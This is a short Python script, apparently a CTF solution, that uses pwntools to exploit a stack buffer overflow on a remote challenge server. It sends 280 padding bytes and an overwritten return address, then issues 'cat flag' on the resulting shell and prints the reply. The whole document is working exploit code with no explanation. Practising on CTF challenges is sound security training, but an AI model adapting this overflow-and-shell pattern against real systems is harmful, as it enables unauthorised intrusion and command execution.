from pwn import *

r = remote("ctf.j0n9hyun.xyz",6515)

payload = "A"*(272+8)

payload += p64(0x0000000000400606)

r.sendline(payload)

r.sendline("cat flag")

print(r.recv(1024))

